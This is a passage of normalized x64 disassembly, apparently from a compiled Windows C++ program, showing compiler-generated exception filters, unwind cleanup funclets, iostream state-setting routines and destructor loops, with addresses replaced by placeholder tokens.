cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_140056028
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
cmp [ rax ] 0xc0000005
je r-xdata
mov eax 0x1
cmp [ rax ] 0xc000001d
je r-xdata
xor eax eax
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_1400560b4
push rbp
sub rsp 0x30
mov rbp rdx
cmp [ rbp + 0x30 ] 0x0
je r-xdata
add rsp 0x30
pop rbp
retn
mov rdx [ rbp + 0x70 ]
cmp [ rbp + 0x34 ] 0x0
je r-xdata
mov ecx [ rdx ]
call sub_140046f04
nop
movsxd rcx [ rdx ]
mov rax rcx
sar rax 0x5
lea r8 [ rw-data ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r8 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
sub_140056150
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rcx [ rbx + 0x10 ]
call j_sub_14003ad04#2
mov rcx [ rbx + 0x20 ]
call j_sub_14003ad04#2
mov rcx [ rbx + 0x28 ]
call j_sub_14003ad04#2
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
sub_140056230
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x38
mov rbp rdx
mov rbx [ rbp + 0x80 ]
mov rcx [ rbx + 0x10 ]
call j_sub_14003ad04#2
mov rcx [ rbx + 0x20 ]
call j_sub_14003ad04#2
mov rcx [ rbx + 0x28 ]
call j_sub_14003ad04#2
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
sub_1400562d0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x90 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x90 ] 0xfffffffe
lea rcx [ rbp + 0x28 ]
call sub_140002a30
sub_140056470
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_140006430
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_1400564b0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140056510
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rcx
inc rcx
call sub_140002750
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_140056550
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rcx [ rdx + 0x68 ]
jmp sub_14003828c
mov rcx [ rbx ]
call j_sub_14003ad04
sub_1400567d0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x78 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_140015410
add rbx 0x58
cmp rbx rdi
jne r-xdata
sub_1400568f0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x78 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_14000e2b0
add rbx 0x40
cmp rbx rdi
jne r-xdata
sub_140056970
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_14000e2b0
add rbx 0x40
cmp rbx rdi
jne r-xdata
sub_140056a70
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140056b10
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_140056bb0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x60 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140056c30
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140056cc0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_140056d60
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x80 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140056e00
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_140056ea0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_140056f40
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x40
mov rbp rdx
mov rcx [ rbp + 0xc0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x40
pop rbp
retn
sub_140056fd0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_140057080
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_1400134b0
add rbx 0x70
cmp rbx rdi
jne r-xdata
sub_140057110
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_140015410
add rbx 0x58
cmp rbx rdi
jne r-xdata
sub_140057170
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
add rbx 0x20
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] 0x0
xor eax eax
mov [ rbx - 0x18 ] ax
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
sub_140057250
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_1400572e0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057360
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_14000f330
add rbx 0x78
cmp rbx rdi
jne r-xdata
sub_140057400
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_140007fb0
sub rbx 0xffffffffffffff80
cmp rbx rdi
jne r-xdata
sub_140057460
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
add rbx 0x48
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] 0x0
xor eax eax
mov [ rbx - 0x18 ] ax
add rbx 0x58
lea rax [ rbx - 0x48 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
sub_140057600
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057680
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057700
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057790
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_140057820
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_1400578a0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x90 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057920
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
sub_1400579d0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x90 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_140057a50
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x48 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x48 ] 0xfffffffe
mov rcx [ rbp + 0x40 ]
add rcx 0x98
call sub_140003820
sub_140057aa0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x40 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x40 ] 0xfffffffe
lea rcx [ rbp + 0x50 ]
add rcx 0x98
call sub_140003820
sub_140057b50
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
add rbx 0x30
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_140057c80
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x48 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x48 ] 0xfffffffe
mov rcx [ rbp + 0x40 ]
add rcx 0x98
call sub_140003820
sub_140057db0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_140015410
add rbx 0x58
cmp rbx rdi
jne r-xdata
sub_140057e60
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x1a8 ]
and eax 0x2
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x1a8 ] 0xfffffffd
lea rcx [ rbp + 0x50 ]
add rcx 0x98
call sub_140003820
sub_140057ed0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x1a8 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x1a8 ] 0xfffffffe
mov rcx [ rbp + 0x1a0 ]
call sub_140001ba0
sub_140057f20
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
nop
int3
nop [ rax ] eax
mov rcx rbx
call sub_14000e350
add rbx 0x48
cmp rbx rdi
jne r-xdata
sub_1400580b0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
add rcx 0x98
call sub_140003820
sub_140058100
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call j_sub_1400070d0
sub_140058580
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
lea rcx [ rbp + 0x40 ]
add rcx 0x98
call sub_140003820
sub_140058970
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x5c ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x5c ] 0xfffffffe
lea rcx [ rbp + 0xa0 ]
add rcx 0x98
call sub_140003820
sub_140058ae0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x70 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x70 ] 0xfffffffe
lea rcx [ rbp + 0xa0 ]
add rcx 0x98
call sub_140003820
sub_140058ba0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
lea rcx [ rbp + 0x30 ]
call sub_140001ba0
sub_140058bd0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x2
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffd
lea rcx [ rbp + 0x80 ]
call sub_140001ba0
sub_140058c40
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call sub_140014e70
sub_140058e70
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call sub_140014e70
sub_140058ee0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_140058fd0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_1400590a0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_1400590f0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_140059200
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call sub_140014e70
sub_140059440
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_1400594f0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x28 ]
call sub_140014e70
sub_140059700
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_1400597e0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_140014e70
sub_140059d80
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov [ rw-data ] 0x1
jne r-xdata
retn
sub_14005a044
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_14003825c
nop
jmp r-xdata
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ rw-data ] rax
mov rcx rbx
call sub_140037d54
mov rcx rbx
call j_sub_14003ad04
lea rcx [ rsp + 0x40 ]
call sub_14003828c
add rsp 0x30
pop rbx
retn
sub_14005a150
sub rsp 0x28
jmp r-xdata
mov rax [ rw-data ]
cmp rax 0xa
jb r-xdata
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
inc rax
mov [ rw-data ] rax
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
add rsp 0x28
retn
call rax
sub_140001000
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_14003a7e8
sub_140001050
retn 0x0
sub_140001bd0
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
retn
mov rax [ rcx ]
retn
j_sub_140002050
jmp sub_140002050
sub_1400027c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140002ab0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140002ae0
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_140002cb0
push rbx
sub rsp 0x20
movzx ebx dx
lea rdx [ rcx + 0x10 ]
movzx ecx r8w
call sub_14003892c
test bx ax
setne al
add rsp 0x20
pop rbx
retn
sub_140002ce0
mov rax r9
mov r10 r8
mov r11 rdx
lea r9 [ rcx + 0x10 ]
mov r8 rax
mov rdx r10
mov rcx r11
jmp sub_140038960
sub_140002de0
movzx eax dx
lea rdx [ rcx + 0x10 ]
movzx ecx ax
